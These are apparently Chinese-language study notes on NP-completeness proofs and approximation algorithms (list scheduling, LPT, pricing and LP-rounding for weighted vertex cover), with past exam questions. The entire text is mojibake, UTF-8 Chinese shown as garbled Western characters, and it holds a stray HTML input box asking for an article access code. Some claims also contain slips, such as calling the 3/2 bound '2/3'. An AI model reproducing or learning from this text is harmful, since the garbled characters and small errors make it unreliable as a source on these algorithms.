â‚é¢˜ç›®3\n\n(2019)è¯æ˜ç‹¬ç«‹é›†é—®é¢˜ï¼ˆç»™å®šä¸€ä¸ªå›¾ï¼Œé—®å›¾ä¸­æ˜¯å¦å­˜åœ¨kä¸ªé¡¶ç‚¹çš„å­é›†ï¼Œä½¿å¾—è¿™ä¸ªå­é›†ä¸­ä»»æ„ä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´åœ¨åŸå›¾ä¸­éƒ½ä¸å­˜åœ¨è¾¹ï¼‰æ˜¯NPå®Œå…¨çš„ã€‚\n\nç­”ï¼šä»ç‚¹è¦†ç›–é—®é¢˜è§„çº¦è¿‡æ¥\n\n**â‡’** \n\nâ€‹\tS æ˜¯å›¾ G çš„ä»»ä¸€ç‹¬ç«‹é›†\nâ€‹\tåˆ™ä»»æ„è¾¹ (u,v)âˆˆEï¼Œæœ‰u âˆ‰ S æˆ– v âˆ‰ Sï¼›é‚£ä¹ˆ uâˆˆV-S æˆ– vâˆˆV-S\nâ€‹\tæ‰€ä»¥å›¾çš„ä»»æ„è¾¹è‡³å°‘æœ‰ä¸€ä¸ªç«¯ç‚¹åœ¨é›†åˆ V-S ä¸­ï¼Œé›†åˆ V-S æ˜¯ä¸€ä¸ªç‚¹è¦†ç›–\n\n**â‡** \n\nâ€‹\tV-S æ˜¯å›¾ G çš„ä»»ä¸€ç‚¹è¦†ç›–\nâ€‹\tåˆ™ä»»æ„è¾¹ (u,v) âˆˆ Eï¼Œæœ‰ u âˆˆ V-S æˆ– v âˆˆ V-S ï¼›é‚£ä¹ˆ u âˆ‰ S æˆ– v âˆ‰ S\nâ€‹\tæ‰€ä»¥å›¾çš„ä»»æ„è¾¹è‡³å°‘æœ‰ä¸€ä¸ªç«¯ç‚¹ä¸åœ¨é›†åˆ S ä¸­ï¼Œé›†åˆ S æ˜¯ä¸€ä¸ªç‹¬ç«‹é›†\n\nâˆ´  Vertex-Cover â‰¡<sub>p</sub> Independent Setï¼Œå³ç‹¬ç«‹é›†é—®é¢˜NPå®Œå…¨çš„\n\n#### âƒé¢˜ç›®4\n\næœ€é•¿è·¯å¾„é—®é¢˜ï¼šç»™å®šç®€å•æ— å‘å›¾ä¸­æ˜¯å¦å­˜åœ¨é•¿åº¦å¤§äºç­‰äºkçš„ç®€å•è·¯å¾„ï¼Ÿè¯·è¯æ˜è¿™ä¸ªé—®é¢˜æ˜¯NPå®Œå…¨é—®é¢˜ã€‚\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"ğŸ””è¯·è¾“å…¥æ–‡ç« æŸ¥çœ‹ç ï¼Œçœ‹æ›´å¤šå†…å®¹\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n## â‘§è¿‘ä¼¼ç®—æ³•\n\n> **æœ¬ç« é‡ç‚¹ï¼š**\n>\n> - ç†è§£ä¸ºä»€ä¹ˆä¼šæœ‰è¿‘ä¼¼ç®—æ³•ï¼Œä»€ä¹ˆæ˜¯è¿‘ä¼¼ç®—æ³•ï¼Œå¦‚ä½•è¯„ä»·è¿‘ä¼¼ç®—æ³•çš„ä¼˜åŠ£ã€‚\n> - æŒæ¡è´Ÿè½½å‡è¡¡é—®é¢˜çš„è¿‘ä¼¼ç®—æ³•åŠå…¶è¿‘ä¼¼æ¯”è¯æ˜ã€‚\n> - æŒæ¡å¸¦æƒé‡çš„é¡¶ç‚¹è¦†ç›–é—®é¢˜çš„å®šä»·ç®—æ³•ï¼Œè¯æ˜è¯¥æ–¹æ³•èƒ½å¾—åˆ°ä¸€ä¸ª2å€è¿‘ä¼¼è§£ã€‚\n> - ç†è§£å¸¦æƒé‡çš„é¡¶ç‚¹è¦†ç›–é—®é¢˜çš„æ•´æ•°è§„åˆ’æ¨¡å‹å¦‚ä½•å»ºç«‹çš„ï¼Œç†è§£æ¾å¼›æ±‚è§£æ–¹æ³•ã€‚\n> - èƒ½å¤Ÿå¯¹ä¸€ä¸ªå›¾é—®é¢˜å»ºç«‹æ•´æ•°è§„åˆ’æ¨¡å‹(å¦‚ï¼šå¸¦æƒé‡çš„é¡¶ç‚¹è¦†ç›–é—®é¢˜ï¼Œå¹¿ä¹‰è´Ÿè½½å‡è¡¡é—®é¢˜)ã€‚\n> - ç†è§£æ±‚è§£0-1èƒŒåŒ…é—®é¢˜çš„åŸºäºå–æ•´æ³•çš„è¿‘ä¼¼ç®—æ³•ã€‚\n> - èƒ½å¤Ÿè®¾è®¡ç®€å•çš„è¿‘ä¼¼ç®—æ³•ï¼Œå¹¶è¯æ˜è¯¥ç®—æ³•æ˜¯å‡ å€è¿‘ä¼¼ç®—æ³•ã€‚\n\n### â¶åŸºç¡€çŸ¥è¯†\n\n#### â€æ¦‚å¿µ\n\nè¿‘ä¼¼çš„æƒ³æ³•å¾ˆç®€å•ï¼Œè¦è§£å†³ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿåšåˆ°\n\n- â‘ æ±‚è§£ç»“æœæ˜¯æœ€ä¼˜çš„ \n- â‘¡åœ¨å¤šé¡¹å¼æ—¶é—´å†…è§£å†³ \n- â‘¢å¯¹äºä»»æ„çš„å®ä¾‹éƒ½èƒ½å¤Ÿé€šè¿‡è¯¥ç®—æ³•è§£å†³ã€‚\n\nç°åœ¨å¯¹äºéƒ¨åˆ†é—®é¢˜ï¼Œæ— æ³•å®Œå…¨æ»¡è¶³ä»¥ä¸Šè¦æ±‚ï¼Œæ‰€ä»¥å°±ç‰ºç‰²äº†â‘ ï¼Œä½†æ˜¯æˆ‘ä»¬å¸Œæœ›ç»“æœä¸æ˜¯ç›²ç›®çš„ï¼Œæ‰€ä»¥å°±å¼•å…¥äº†è¿‘ä¼¼çš„æ¦‚å¿µã€‚è¿‘ä¼¼ç®—æ³•å…¶å®æ˜¯é’ˆå¯¹NPéš¾é—®é¢˜çš„ä¸€ç§é€€è®©ï¼Œå¯¹äºè®¸å¤š P ä¸ç­‰äº NP çš„æœ€ä¼˜åŒ–é—®é¢˜ï¼Œæ— æ³•åœ¨å¤šé¡¹å¼æ—¶é—´å†…æ‰¾åˆ°æœ€ä¼˜è§£ã€‚å› æ­¤ï¼Œå¦‚æœå¯ä»¥åªæ±‚ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥æ¥å—çš„è§£ï¼Œè€Œä¸æ˜¯éè¦æœ€ä¼˜è§£ï¼Œé‚£ä¹ˆå¯èƒ½å­˜åœ¨ä¸€ä¸ªå¤šé¡¹å¼æ—¶é—´çš„ç®—æ³•ã€‚\n\n#### âæ€æƒ³\n\næ”¾å¼ƒæ±‚è§£æœ€ä¼˜è§£ï¼Œç”¨è¿‘ä¼¼æœ€ä¼˜è§£ä»£æ›¿æœ€ä¼˜è§£ï¼Œä»¥æ­¤æ¢å–ï¼š\n- ç®—æ³•è®¾è®¡ä¸Šçš„ç®€åŒ–\n- æ—¶é—´å¤æ‚æ€§çš„é™ä½\n\n#### â‚æ€§èƒ½\n\nè¿‘ä¼¼ç®—æ³•é€šå¸¸é‡‡ç”¨ä¸¤ä¸ªæ ‡å‡†æ¥è¡¡é‡æ€§èƒ½ï¼š\n\n- ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ï¼ˆå¿…é¡»ä¸ºå¤šé¡¹å¼çº§çš„ï¼‰\n- è§£çš„è¿‘ä¼¼ç¨‹åº¦ï¼ˆå¯èƒ½ä¸ç®—æ³•è®¾è®¡ã€é—®é¢˜è§„æ¨¡ã€è¾“å…¥å®ä¾‹ç­‰æœ‰å…³ï¼‰\n\n### â·è´Ÿè½½å‡è¡¡é—®é¢˜\n\n> æŒæ¡è´Ÿè½½å‡è¡¡é—®é¢˜çš„è¿‘ä¼¼ç®—æ³•åŠå…¶è¿‘ä¼¼æ¯”è¯æ˜\n\n`é—®é¢˜æè¿°ï¼š`æœ‰ m å°ç›¸åŒæœºå™¨ï¼Œn ä¸ªä»»åŠ¡ï¼Œä»»åŠ¡ j çš„å¤„ç†æ—¶é—´ä¸º t<sub>j</sub>ï¼Œæ¯ä¸ªä»»åŠ¡åªèƒ½åœ¨ä¸€å°æœºå™¨ä¸Šè¿ç»­å·¥ä½œï¼Œä¸€å°æœºå™¨åŒä¸€æ—¶é—´åªèƒ½å¤„ç†ä¸€ä¸ªä»»åŠ¡ã€‚æˆ‘ä»¬è®¤ä¸ºå®Œæˆæœ€åä¸€ä¸ªä»»åŠ¡æ‰€éœ€çš„æ—¶é—´ä¸ºè´Ÿè½½æ—¶é—´ï¼Œå¸Œæœ›èƒ½å¤Ÿè®©è¿™ä¸ªè´Ÿè½½æ—¶é—´æœ€çŸ­ã€‚\n\næœºå™¨ i çš„è´Ÿè½½(æœºå™¨ i å¤„ç†ä»»åŠ¡çš„æ—¶é—´ä¹‹å’Œ)ï¼šL[i] = âˆ‘<sub>jâˆˆS[i]</sub> t<sub>j</sub> ï¼ŒS[i] ä¸ºåˆ†é…ç»™æœºå™¨ i çš„ä»»åŠ¡é›†åˆ\næœ€ä¼˜å·¥æœŸ(å®Œæˆæ‰€æœ‰å·¥ä½œçš„æœ€çŸ­æ—¶é—´è·¨åº¦[makespan])ï¼šL<sup>âˆ—</sup> = max<sub>i</sub>L[i]\n\nä¼˜åŒ–é—®é¢˜ï¼šå¯»æ‰¾ä¸€ä¸ªåˆ†é…æ–¹æ¡ˆæœ€ä¼˜å·¥æœŸ\nå†³ç­–é—®é¢˜ï¼šæ˜¯å¦å­˜åœ¨ä¸€ä¸ªåˆ†é…æ–¹æ¡ˆä½¿å·¥æœŸä¸º L<sup>âˆ—</sup>\n\n**ä¸¤ä¸ªå¼•ç†ï¼š**\n\n- **å¼•ç†1ï¼š**L<sup>âˆ—</sup> â‰¥ max(t<sub>j</sub>)ï¼ˆæœ€ä¼˜å·¥æœŸå¤§äºç­‰äºå®Œæˆæœ€é•¿çš„å·¥ä½œæ‰€éœ€æ—¶é—´ï¼‰\n- **å¼•ç†2ï¼š**L<sup>âˆ—</sup> â‰¥ (1/m)âˆ‘<sub>j</sub>t<sub>j</sub> ï¼ˆæœ€ä¼˜å·¥æœŸå¤§äºç­‰äºæ‰€æœ‰ä»»åŠ¡çš„å¹³å‡æ—¶é—´)\n\nè´Ÿè½½å‡è¡¡é—®é¢˜æ˜¯ NPH é—®é¢˜ï¼Œå› ä¸ºåˆ†å‰²é—®é¢˜ â‰¤<sub>p</sub> è´Ÿè½½å‡è¡¡é—®é¢˜\n\n#### â€2å€è¿‘ä¼¼ç®—æ³•-List Scheduling\n\nList Scheduling æ˜¯ä¸€ç§è´ªå¿ƒç­–ç•¥ï¼Œå®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯å°†å„ä¸ªå·¥ä½œä¾æ¬¡å®‰æ’åˆ°ç´¯è®¡å·¥ä½œæ—¶é•¿æœ€çŸ­çš„æœºå™¨ä¸­ï¼Œä¸‹é¢çš„åŠ¨å›¾æ˜¾ç¤ºäº†è¿™ä¸€è¿‡ç¨‹ã€‚å¯ä»¥å‘ç°ï¼Œè¿™ç§è´ªå¿ƒçš„åˆè¡·åªè€ƒè™‘äº†çœ¼å‰çš„æœ€å°å€¼ï¼Œè€Œå±€éƒ¨æœ€ä¼˜è§£å¹¶ä¸ä¸€å®šæ˜¯æœ€ç»ˆçš„æœ€ä¼˜è§£ã€‚\n\n![](https://img.jwt1399.top/img/202111122021025.webp)\n\n`2å€è¿‘ä¼¼åº¦è¯æ˜ï¼š`\n\nè®¾æœºå™¨ i æ˜¯ç“¶é¢ˆæœºå™¨(åˆ™ L[i] ä¸ºè´ªå¿ƒè§£)ï¼Œä»»åŠ¡ j æ˜¯æœ€åä¸€ä¸ªåœ¨æœºå™¨ i ä¸Šè°ƒåº¦çš„ä»»åŠ¡ï¼ˆåœ¨è°ƒåº¦å‰ï¼Œæœºå™¨ i çš„å·¥æœŸæ˜¯æœ€å°çš„ï¼‰æˆ‘ä»¬åœ¨è€ƒè™‘æ”¾å…¥æœ€åä¸€ä¸ªä»»åŠ¡å‰ï¼Œæ ¹æ®æˆ‘ä»¬æ”¾ç½®çš„è§„åˆ™ï¼Œè¯¥æœºå™¨ i æ˜¯æ‰€æœ‰æœºå™¨ä¸­è€—æ—¶æœ€çŸ­çš„(L[i] âˆ’ t<sub>j </sub>â‰¤ L[k])ï¼Œè¯¥æœºå™¨æ­¤æ—¶çš„ç”¨æ—¶(L[i] - t<sub>j</sub>)æ˜¯ä½äºé™¤æ‰æœ€åä¸€ä¸ªä»»åŠ¡ j åçš„å¹³å‡æ—¶é•¿(1/m)âˆ‘<sub>k</sub> L[k]ï¼Œæ›´ä½äºæ‰€æœ‰ä»»åŠ¡çš„å¹³å‡æ—¶é•¿(1/m)âˆ‘<sub>j</sub>t<sub>j</sub>(å¼•ç†2)ï¼›å†æ ¹æ®å¼•ç†1ï¼Œæœ€åä¸€ä¸ªä»»åŠ¡åº”è¯¥æ˜¯å°äºæœ€ä¼˜è§£çš„ã€‚\n\nL[i] âˆ’ t<sub>jÂ </sub>â‰¤ L[k]ï¼Œå¯¹ä»»æ„ 1 â‰¤ k â‰¤ m\n\nL[i] âˆ’ t<sub>j</sub> â‰¤ (1/m) âˆ‘<sub>k</sub>L[k] \n\nâ€‹\t\t\t\tâ‰¤ (1/m)âˆ‘<sub>j</sub>t<sub>j</sub> \n\nâ€‹\t\t\t\tâ‰¤ L<sup>âˆ—</sup> \n\nL<sup>âˆ—</sup>  = L[i] = (L[i] âˆ’ t<sub>j</sub>) + t<sub>j</sub> â‰¤ 2L<sup>âˆ—</sup> \n\nL[i] âˆ’ t<sub>j</sub> â‰¤  L<sup>âˆ—</sup> ï¼Œt<sub>j</sub> â‰¤ L<sup>âˆ—</sup> \n\nâˆ´ L[i] â‰¤ 2L<sup>âˆ—</sup> \n\n#### â3/2å€è¿‘ä¼¼ç®—æ³•-LPT Rule\n\nä¸Šè¿°è´ªå¿ƒç­–ç•¥å­˜åœ¨ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ¼æ´ï¼Œå½“æœ€ååŠ å…¥çš„å·¥ä½œæ‰€èŠ±æ—¶é—´æœ€é•¿æ—¶ï¼Œæ•ˆæœå¾ˆå·®ã€‚å› æ­¤æˆ‘ä»¬å¸Œæœ›å…ˆå®‰æ’é•¿å·¥ä½œï¼Œå°†æ‰€æœ‰å·¥ä½œ**æŒ‰èŠ±è´¹æ—¶é—´é™åºæ’åˆ—**ï¼Œå†æ‰§è¡Œä¸Šè¿°è´ªå¿ƒç®—æ³•ï¼Œè¿™å°±æ˜¯ Longest Processing Time Rule çš„æ ¸å¿ƒæ€æƒ³ã€‚\n\n`3/2å€è¿‘ä¼¼åº¦è¯æ˜ï¼š`\n\nå½“ n â‰¤ m æ—¶ï¼Œåˆ™æ¯å°æœºå™¨æœ€å¤šå®‰æ’ä¸€ä¸ªå·¥ä½œï¼Œå®¹æ˜“æ‰¾åˆ°æœ€ä¼˜è§£ã€‚ å½“ n â‰¥ m æ—¶ï¼Œå…ˆå°† m ä¸ªä»»åŠ¡å®‰æ’åˆ° m å°æœºå™¨ï¼Œé‚£ä¹ˆå¯¹ç¬¬ m+1 ä¸ªå·¥ä½œï¼Œæœ‰ 2t<sub>m+1</sub> â‰¤ L<sup>âˆ—</sup> ï¼ˆç“¶é¢ˆæœºå™¨è‡³å°‘è¦åšä¸¤ä¸ªä»»åŠ¡ï¼Œä¸¤ä¸ªä»»åŠ¡çš„æ—¶é—´æ€»å’Œ â‰¥ 2t<sub>m+1</sub>ï¼‰\n\nç”±ä¸Šé¢è¯æ˜å¯å¾—ï¼šL[i] âˆ’ t<sub>j</sub> â‰¤  L<sup>âˆ—</sup> \n\nåˆâˆµ 2t<sub>m+1</sub> â‰¤ L<sup>âˆ—</sup> â‡’ t<sub>j</sub> â‰¤ (1/2)L<sup>âˆ—</sup> \n\nL<sup>âˆ—</sup>  = L[i] = (L[i] âˆ’ t<sub>j</sub>) + t<sub>j</sub> â‰¤ (3/2)L<sup>âˆ—</sup> \n\nâˆ´ L[i] â‰¤ (3/2)L<sup>âˆ—</sup> \n\nä½†å…¶å® 2/3 å€è¿‘ä¼¼å¹¶ä¸æ˜¯ç´§å¯†çš„ï¼ŒGraham åœ¨1969å¹´ï¼Œè®¡ç®—å‡º LPT Rule æ˜¯è´Ÿè½½å‡è¡¡é—®é¢˜çš„ä¸€ä¸ª 4/3 è¿‘ä¼¼ç®—æ³•ã€‚å› æ­¤ 4/3 å€è¿‘ä¼¼æ‰æ˜¯ç´§å¯†çš„ã€‚\n\n\n### â¸å¸¦æƒé¡¶ç‚¹è¦†ç›–é—®é¢˜\n\n> æŒæ¡å¸¦æƒé‡çš„é¡¶ç‚¹è¦†ç›–é—®é¢˜çš„å®šä»·ç®—æ³•ï¼ˆPricing methodï¼‰ï¼Œè¯æ˜è¯¥æ–¹æ³•èƒ½å¾—åˆ°ä¸€ä¸ª2å€è¿‘ä¼¼è§£ï¼›\n>\n> ç†è§£å¸¦æƒé‡çš„é¡¶ç‚¹è¦†ç›–é—®é¢˜çš„æ•´æ•°çº¿æ€§è§„åˆ’(Integer linear programming)æ¨¡å‹å¦‚ä½•å»ºç«‹çš„ï¼Œç†è§£æ¾å¼›æ±‚è§£æ–¹æ³•ï¼›\n>\n> è¦æ±‚ä¼šå¯¹ä¸€ä¸ªå›¾é—®é¢˜å»ºç«‹æ•´æ•°çº¿æ€§è§„åˆ’æ¨¡å‹ï¼ˆä»¥ç‚¹è¦†ç›–é—®é¢˜ä¸ºä¾‹ï¼‰\n\n`é—®é¢˜æè¿°ï¼š`å¯¹äºé¡¶ç‚¹è¦†ç›–é—®é¢˜ï¼ˆä¸€ä¸ªç‚¹çš„é›†åˆä½¿å¾—å›¾ä¸­æ‰€æœ‰è¾¹è‡³å°‘æœ‰ä¸€ä¸ªç«¯ç‚¹åœ¨é›†åˆå†…ï¼‰ï¼Œå¸¦æƒç‚¹è¦†ç›–é—®é¢˜ä¸­ï¼Œéœ€è¦æ»¡è¶³è¿™ä¸ªé›†åˆä¸­æ‰€æœ‰ç‚¹çš„æƒå€¼ä¹‹å’Œæœ€å°ã€‚\n\nå¦‚ä¸‹å›¾å·¦è¾¹å°±æ˜¯ä¸€ä¸ªå¸¦æƒçš„æœ€å°é¡¶ç‚¹è¦†ç›–\n\n![](https://img.jwt1399.top/img/202111122306124.png)\n\n#### â€2å€è¿‘ä¼¼ç®—æ³•-Pricing method\n\nç»™æ¯æ¡è¾¹ e = (i,j) èµ‹äºˆä¸€ä¸ªä»·æ ¼ p<sub>e</sub> â‰¥ 0 ï¼Œä»»æ„é¡¶ç‚¹ i çš„æƒé‡å¤§äºç­‰äºä¸å…¶é‚»æ¥çš„æ‰€æœ‰è¾¹ä»·æ ¼æ€»å’Œï¼šâˆ‘<sub>e=(i,j)Â </sub>p<sub>eÂ </sub>â‰¤ w<sub>i</sub>\n\n**å…¬å¹³å¼•ç†ï¼š**å¯¹äºä»»æ„é¡¶ç‚¹è¦†ç›–é›†åˆ S å’Œä»»æ„å…¬å¹³ä»·æ ¼ p<sub>e</sub> ï¼Œæœ‰âˆ‘<sub>e</sub> p<sub>e </sub>â‰¤ w(S)\n\n![](https://img.jwt1399.top/img/202111131323355.png)\n\n ç®—æ³•ï¼šä»»é€‰ä¸€æ¡è¾¹ (i, j) åŠ ä¸Šä»£ä»·ï¼Œè¿™ä¸ªä»£ä»·ä»é›¶å¼€å§‹ï¼Œä¸”è¿™ä¸ªä»£ä»·çš„æœ€å¤§å€¼å°äº i å’Œ j èŠ‚ç‚¹çš„æƒå€¼ã€‚æ˜¾ç„¶ï¼Œè¿™ä¸ªè¾¹æƒå€¼çš„æœ€å¤§å€¼å–å†³äºä¸¤ä¸ªç«¯ç‚¹æƒå€¼çš„æœ€å°å€¼ï¼Œæˆ‘ä»¬è®¤ä¸ºå½“è¾¹æƒå€¼ä¸ç‚¹æƒå€¼ç›¸ç­‰æ—¶ï¼Œå¯¹åº”çš„é‚£ä¸ªç‚¹æ˜¯ç´§çš„ã€‚æŠŠæ‰€æœ‰ç´§çš„ç‚¹æ‰¾å‡ºæ¥å³ä¸ºé¡¶ç‚¹è¦†ç›–ã€‚\n\nå®šä»·æ³•æ±‚è§£ç‚¹è¦†ç›–é—®é¢˜ï¼Œä¸¾ä¾‹å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202111131334754.png)\n\nä¸Šå›¾ä¸­ï¼Œæœ€å tight çš„ç‚¹ {a, b, d}ï¼Œå³ä¸ºæœ€å°çš„å¸¦æƒç‚¹è¦†ç›–ï¼Œæƒä¸º 10\n\n`2å€è¿‘ä¼¼åº¦è¯æ˜ï¼š`\n\nè®¾ S ä¸ºç®—æ³•ç»ˆæ­¢æ—¶æ‰€æœ‰ç´§èŠ‚ç‚¹çš„é›†åˆã€‚æ˜“å¾— S æ˜¯é¡¶ç‚¹è¦†ç›–ï¼ˆåè¯ï¼šå¦‚æœæŸæ¡è¾¹æ²¡æœ‰è¢«è¦†ç›–åˆ°ï¼Œåˆ™å…¶ä¸¤ä¸ªç«¯ç‚¹éƒ½æ²¡æœ‰è¦†ç›–å¾ˆç´§ï¼Œç®—æ³•ä¸ä¼šç»ˆæ­¢ï¼‰\n\nw(S) ç­‰äºæ‰€é€‰çš„èŠ‚ç‚¹çš„æƒå€¼ä¹‹å’Œï¼Œç­‰äºæ‰€é€‰èŠ‚ç‚¹æ‰€å¯¹åº”çš„è¾¹æƒä¹‹å’Œï¼Œå¯ä»¥æŠŠå®ƒæ”¾å¤§åˆ°æ‰€æœ‰èŠ‚ç‚¹å¯¹åº”è¾¹æƒä¹‹å’Œï¼Œè¿™æ ·å› ä¸ºä¸€æ¡è¾¹ (u, v) åœ¨ u ä¸Šç®—è¿‡ä¸€æ¬¡åè¿˜è¦åœ¨ v ä¸Šç®—ä¸€æ¬¡ï¼Œæ‰€ä»¥ç­‰äºè¾¹æƒå’Œçš„ä¸¤å€ã€‚å†ç”±ä¸Šé¢å…¬å¹³å¼•ç†å¯å¾—ã€‚\n\n![](https://img.jwt1399.top/img/202111131352401.png)\n\nâˆ´ å®šä»·ç®—æ³•æ˜¯2å€è¿‘ä¼¼ç®—æ³•\n\n#### â2å€è¿‘ä¼¼ç®—æ³•-ILP\n\nå¯¹æ¯ä¸€ä¸ªç‚¹ i ï¼Œç”¨ bool å˜é‡ x<sub>i</sub> è¡¨ç¤ºå…¶æ˜¯å¦åœ¨ç‚¹è¦†ç›–é›†åˆä¸­ã€‚\n\n- x<sub>i</sub>=0ï¼Œè¡¨ç¤ºç‚¹ i ä¸åœ¨ç‚¹è¦†ç›–ä¸­ï¼›\n- x<sub>i</sub>=1ï¼Œè¡¨ç¤ºç‚¹ i åœ¨ç‚¹è¦†ç›–ä¸­ã€‚\n\nå› æ­¤ï¼Œæ•´æ•°è§„åˆ’å¸¦æƒç‚¹è¦†ç›–é—®é¢˜è½¬æ¢ä¸ºï¼š\n\n![](https://img.jwt1399.top/img/image-20211126210059636.png)\n\nå¦‚æœ x<sup>\\*</sup> æ˜¯ ILP çš„æœ€ä¼˜è§£ï¼Œé‚£ä¹ˆ S= { iâˆˆVï½œx<sub>i</sub>*=1 }æ˜¯æœ€å°æƒé‡é¡¶ç‚¹è¦†ç›–ã€‚\n\nç‚¹è¦†ç›–çš„æ•´æ•°è§„åˆ’æ˜¯ä¸€ä¸ªNPéš¾é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬å¸Œæœ›èƒ½æ‰¾åˆ°å®ƒçš„è¿‘ä¼¼ç®—æ³•ï¼Œç‰ºç‰²å‡†ç¡®åº¦ä»¥å¿«é€Ÿæ±‚è§£ã€‚å¾ˆå®¹æ˜“æƒ³åˆ°æŠŠå®ƒè½¬åŒ–ä¸ºçº¿æ€§è§„åˆ’é—®é¢˜(LP)ï¼Œå¹¶æ‰¾åˆ°å®ƒçš„è¿‘ä¼¼ç¨‹åº¦ã€‚å»ºç«‹å¦‚ä¸‹çº¿æ€§è§„åˆ’ï¼Œä¸æ•´æ•°çº¿æ€§è§„åˆ’åŒºåˆ«åœ¨äºç¬¬ä¸‰å¼ã€‚\n\n![](https://img.jwt1399.top/img/image-20211126211321308.png)\n\nçº¿æ€§è§„åˆ’çš„çº¦æŸæ¡ä»¶ä¸å¦‚æ•´æ•°è§„åˆ’è‹›åˆ»ï¼Œæ‰€ä»¥**çº¿æ€§è§„åˆ’(LP)çš„æœ€ä¼˜è§£ â‰¤  æ•´æ•°è§„åˆ’(ILP)çš„æœ€ä¼˜è§£**ã€‚\n\nä½†ä¼šå¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼ŒåŠ å…¥ç‚¹è¦†ç›–é›†åˆä¸­çš„ç‚¹ i å…¶ x<sub>i</sub> ææœ‰å¯èƒ½æ˜¯åˆ†æ•°ï¼Œä¼šå‘ˆç°å¦‚ä¸‹å½¢å¼\n\n![](https://img.jwt1399.top/img/202112091214071.png)\n\n**å®šç†ï¼š** å¦‚æœ x<sup>\\*</sup> æ˜¯ LP çš„æœ€ä¼˜è§£ï¼Œé‚£ä¹ˆç‚¹è¦†ç›–S=\\{iâˆˆVï½œx<sub>i</sub>* â‰¥ 1/2}ï¼Œä¸”æ˜¯å‡†ç¡®è§£çš„2å€è¿‘ä¼¼ã€‚\n\n`2å€è¿‘ä¼¼åº¦è¯æ˜ï¼š`\n\nå¯¹äºè¾¹ (i,j) âˆˆ Eï¼Œç‚¹è¦†ç›–ä¸­æœ‰ x<sub>i</sub>* + x<sub>j</sub>*  â‰¥ 1ï¼Œåˆ™ x<sub>i</sub>* â‰¥ 1/2 æˆ– x<sub>j</sub>* â‰¥ 1/2  â‡’ è¾¹ (i,j) è¢«è¦†ç›–\nè®¾ILPç‚¹è¦†ç›–çš„æœ€ä¼˜é¡¶ç‚¹è¦†ç›–ä¸º S* ï¼Œæœ‰\n\nâ€ƒâ€ƒâ€ƒâ€ƒâ€ƒ![](https://img.jwt1399.top/img/image-20211126213525333.png)\n\nç¬¬ä¸€ä¸ªä¸ç­‰å¼ï¼šæ ¹æ®æ•´æ•°è§„åˆ’çš„æœ€ä¼˜è§£ä¸å°äºçº¿æ€§è§„åˆ’è¿™ä¸€æ€§è´¨æ”¾ç¼©ï¼›\nç¬¬äºŒä¸ªä¸ç­‰å¼ï¼šx<sub>i</sub>* â‰¥ 1/2 \n\nâ‡’âˆ‘<sub>iâˆˆS</sub> W<sub>i</sub> â‰¤ 2âˆ‘<sub>iâˆˆS\\*</sub> W<sub>i</sub> \n\nâˆ´ æ•´æ•°è§„åˆ’æ˜¯2å€è¿‘ä¼¼ç®—æ³•\n\n### â¹01èƒŒåŒ…é—®é¢˜\n\nã€‚ã€‚ã€‚\n\n### âºçœŸé¢˜ç»ƒä¹ \n\n#### â€é¢˜ç›®1\n\n(2020)ç»™å®šæ­£æ•´æ•°é›†åˆ A = {a<sub>1</sub>,a<sub>2</sub>,a<sub>3</sub>,â€¦,a<sub>n</sub>} å’Œæ­£æ•´æ•° bï¼Œb â‰¥ max {a<sub>1</sub>,a<sub>2</sub>,a<sub>3</sub>,â€¦,a<sub>n</sub>}ã€‚å½“é›†åˆ A çš„å­é›† SâˆˆA ä¸­çš„å…ƒç´ ä¹‹å’Œå°äºç­‰äº b æ—¶ï¼Œå³ âˆ‘<sub>a<sub>i</sub>âˆˆS[i]</sub> a<sub>i</sub>â‰¤bï¼Œæˆ‘ä»¬ç§° S ä¸ºå¯è¡Œé›†ã€‚è¯·å¯»æ‰¾å…ƒç´ ä¹‹å’Œæœ€å¤§çš„å¯è¡Œé›† S ã€‚ä¾‹å¦‚ï¼ŒA = {8,2,4}ï¼Œb= 11ï¼Œåˆ™æœ€ä¼˜çš„å¯è¡Œé›†ä¸º S = {8,2}ï¼Œæœ€ä¼˜è§£ä¸º 8ï¼‹2=10 (10åˆ†)\n\n(1)ä¸‹é¢æ˜¯æ±‚è§£è¿™ä¸ªé—®é¢˜çš„ç®—æ³•ã€‚é›†åˆ S åˆå§‹ä¸ºç©ºé›†ï¼›æŒ‰ç…§ä¸‹æ ‡ i ä»å°åˆ°å¤§çš„é¡ºåºä¾æ¬¡è€ƒå¯Ÿé›†åˆ A ä¸­çš„æ¯ä¸ªæ•´æ•° a<sub>i</sub>ï¼Œå¦‚æœ Î±<sub>i</sub> + âˆ‘<sub>a<sub>k</sub>âˆˆS</sub> a<sub>k</sub>ï¼œb ï¼Œåˆ™å°† a<sub>iÂ </sub>æ·»åŠ é›†åˆ S ä¸­ï¼Œå³ S = S U {a<sub>i</sub>}ã€‚è¯æ˜è¿™ä¸ªç®—æ³•ä¸æ˜¯1/2å€è¿‘ä¼¼ç®—æ³•ã€‚(3åˆ†)\n\n------\n\nè®¾é›†åˆ A = {1ï¼Œ4}ï¼Œb = 4\n\næ ¹æ®è¯¥ç®—æ³•æ±‚å¾—å¯è¡Œé›† S = {1} ï¼Œè§£ä¸º âˆ‘S = 1 \n\nâ€‹           è€Œæœ€ä¼˜å¯è¡Œè§£ S* = {4}ï¼Œæœ€ä¼˜è§£ âˆ‘S* = 4\n\nâ‡’ âˆ‘S = (1/4)âˆ‘S* < (1/2)âˆ‘S*\n\nâˆ´è¯¥ç®—æ³•ä¸æ˜¯1/2å€è¿‘ä¼¼ç®—æ³•\n\n------\n\n(2)ä¸ºè¯¥é—®é¢˜è®¾è®¡O(nlogn)æ—¶é—´å¤æ‚åº¦çš„è¿‘ä¼¼ç®—æ³•ï¼Œå¹¶è¯æ˜è¯¥ç®—æ³•æ˜¯1/2å€è¿‘ä¼¼ç®—æ³•(7åˆ†)\n\n------\n\nåœ¨ (1) ä¸­ 